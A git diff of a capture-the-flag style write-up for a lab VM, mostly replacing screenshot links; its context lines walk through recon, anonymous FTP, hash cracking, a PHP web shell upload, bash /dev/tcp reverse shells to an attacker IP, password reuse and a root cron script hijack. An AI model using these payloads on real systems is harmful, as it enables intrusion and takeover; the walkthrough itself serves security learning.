@@ -11,12 +11,12 @@ Run `sudo netdiscover -r 192.168.0.0/24` before starting the target VM to captur
 now start the target VM and wait for new machine IP entry it will be the IP of our target VM.
 
 Before starting the target VM 
-
-![image](https://github.com/Aftab700/scripts/assets/79740895/dd251727-90da-47f8-8241-f8102789f208)
+![image](https://github.com/Aftab700/Writeups/assets/79740895/264f4aa5-62fd-47d0-bb51-88a1fe8211e7)
 
 After starting the target VM 
 
-![image](https://github.com/Aftab700/scripts/assets/79740895/0c04cd06-d751-45e5-8d5c-a9fada2715c3)
+![image](https://github.com/Aftab700/Writeups/assets/79740895/48ec1846-d9e4-4f40-a996-91b68db451f8)
+
 
 Now that we have the target IP `192.168.0.113` let's run the `nmap`
 
@@ -72,9 +72,10 @@ Here we see that port `21,22,80` are open.
 In port 21 Anonymous FTP login is allowed  \
 to see what files are present in this ftp we can open `ftp://192.168.0.113/` in windows File Explorer or we can also use curl
 
-![image](https://github.com/Aftab700/scripts/assets/79740895/799cc963-eed3-49a0-bd76-c60ad9b4bc6e)
+![image](https://github.com/Aftab700/Writeups/assets/79740895/94033cfd-6173-49d2-bc31-18b3621d137f)
 
-![image](https://github.com/Aftab700/scripts/assets/79740895/ce5d5add-9ec1-4471-aaec-bc22d5a34756)
+![image](https://github.com/Aftab700/Writeups/assets/79740895/8028de5e-668e-4123-8aef-42e27cb07c85)
+
 
 The note says `The StudentRegno number is what you use for login` which is `10201321` and
 we have one password hash `cd73502828457d15655bbd7a63fb0bc8`. use tools like https://crackstation.net/ to crack the hash. \
@@ -85,7 +86,8 @@ now we have login credentials `10201321:student` note this for now and let's mov
 
 `http://192.168.0.113/` is Apache2 Debian Default Page
 
-![image](https://github.com/Aftab700/scripts/assets/79740895/eca423f6-d907-4274-b7fa-f6e3c2db6195)
+![image](https://github.com/Aftab700/Writeups/assets/79740895/d0094763-f520-4028-a338-0aca0d6cb604)
+
 
 There is nothing much to see in this default page so let's do the directory brute force
 
@@ -119,11 +121,13 @@ We found the `/phpmyadmin/` and `/academy/` directories
 
 on the `http://192.168.0.113/academy/` page we have one login form
 
-![image](https://github.com/Aftab700/scripts/assets/79740895/b02dbd16-5f94-4320-8ca5-47db310e3640)
+![image](https://github.com/Aftab700/Writeups/assets/79740895/8dcd96ba-f63a-4524-9ea6-95156c8ce0df)
+
 
 Let's try the login login credentials `10201321:student` that we found previously from ftp note.
 
-![image](https://github.com/Aftab700/scripts/assets/79740895/d03c1c00-ab3e-4208-9b2c-0a94bf6ee40c)
+![image](https://github.com/Aftab700/Writeups/assets/79740895/a36b56d4-987e-4e97-834f-f1f0fc105bf4)
+
 
 It worked we are now logged in
 
@@ -131,33 +135,39 @@ On the My Profile page we have file upload functionality
 
 try uploading simple php shell `<?php system($_REQUEST['cmd']); ?>` and it is not blocked we now have the ability to execute commands on server
 
-![image](https://github.com/Aftab700/scripts/assets/79740895/7c63f62b-0f51-4997-9a3d-f6e2c9cf6e6b)
+![image](https://github.com/Aftab700/Writeups/assets/79740895/08e0c9d1-2522-4e8a-9fc3-4a19c13bc969)
+
 
 we can get reverse shell by this payload `cmd=bash+-c+"bash+-i+>%26+/dev/tcp/192.168.0.207/9001+0>%261"`
 
-![image](https://github.com/Aftab700/scripts/assets/79740895/029bc3e4-be4b-4635-a02e-7db95c2b2f46)
-![image](https://github.com/Aftab700/scripts/assets/79740895/5f49619c-52aa-4b19-84a9-d5d442b8a673)
+![image](https://github.com/Aftab700/Writeups/assets/79740895/4dc9b13a-e0a3-4ff4-82fd-5a32fb2b0270)
+
+![image](https://github.com/Aftab700/Writeups/assets/79740895/4cf54a48-a797-4c62-ae47-f0e3a7fa91a5)
+
 
 In the config.php file we have the mysql_password `My_V3ryS3cur3_P4ss` and in the ftp note we show line `I told him not to use the same password everywhere` which implies 
 that user Grimmie is reusing the same password so we can try to use this password to switch to user Grimmie
 
-![image](https://github.com/Aftab700/scripts/assets/79740895/7f5a0fc4-7a52-46d2-9d02-74dd1ab9c017)
+![image](https://github.com/Aftab700/Writeups/assets/79740895/a6efd8be-7132-4ee9-86b2-b44bcb917ba6)
+
 
 looking at crontab we notice that `/home/grimmie/backup.sh` file is running as root and we can modify this file to get root access
 
-![image](https://github.com/Aftab700/scripts/assets/79740895/d4c1bbe8-60db-4eb1-99fb-50ab48aec36d)
+![image](https://github.com/Aftab700/Writeups/assets/79740895/ee82ccab-380c-485d-855c-247e8e2e7dcc)
+
 
 Reverse shell payload to get shell as root: 
 
 `echo 'bash -c "bash -i >& /dev/tcp/192.168.0.207/9002 0>&1"' > backup.sh`
 
-![image](https://github.com/Aftab700/scripts/assets/79740895/8990e9af-2c66-482d-9885-9382f8b3f0b6)
+![image](https://github.com/Aftab700/Writeups/assets/79740895/0c2c4b55-7951-4637-ab07-86077b1ce395)
 
-![image](https://github.com/Aftab700/scripts/assets/79740895/d286d468-c3f1-4a67-b46f-faa93150976f)
+![image](https://github.com/Aftab700/Writeups/assets/79740895/b1a801aa-7b03-4d4d-849a-6a7532c95b22)
+
 
 Flag:
 
-![image](https://github.com/Aftab700/scripts/assets/79740895/a128299b-e5a6-4669-b1bd-582b7d853dd5)
+![image](https://github.com/Aftab700/Writeups/assets/79740895/50dbf9b2-9236-4656-95ff-e7747b222a6c)
 
 <br>
 
